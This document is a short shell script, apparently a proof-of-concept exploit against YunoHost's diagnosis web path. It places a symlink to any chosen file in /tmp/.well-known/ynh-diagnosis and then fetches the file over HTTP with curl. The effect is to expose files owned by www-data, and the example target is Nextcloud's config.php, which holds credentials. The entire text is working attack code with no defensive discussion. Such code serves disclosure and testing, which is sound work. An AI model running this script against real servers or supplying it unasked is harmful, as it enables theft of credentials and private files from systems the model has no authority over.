#!/bin/sh
#
# Allows local file disclosure for any files owned by wwww-data
#
# usage: yunohost-unauthorized-file-disclosure.sh <filename>
#   e.g. yunohost-unauthorized-file-disclosure.sh /var/www/nextcloud/config/config.php
#

set -eu

if [ "$#" -ne 1 ]; then
    echo "usage: $0 <filename>"
    echo "  e.g. $0 /var/www/nextcloud/config/config.php"
    exit 1
fi

file="$1"
filename="$(basename "$file")"
hostname="$(hostname -f)"
tmpdir="/tmp/.well-known/ynh-diagnosis"

ln -s "$file" "$tmpdir/$filename"

curl "http://$hostname/.well-known/ynh-diagnosis/$filename"

rm "$tmpdir/$filename"

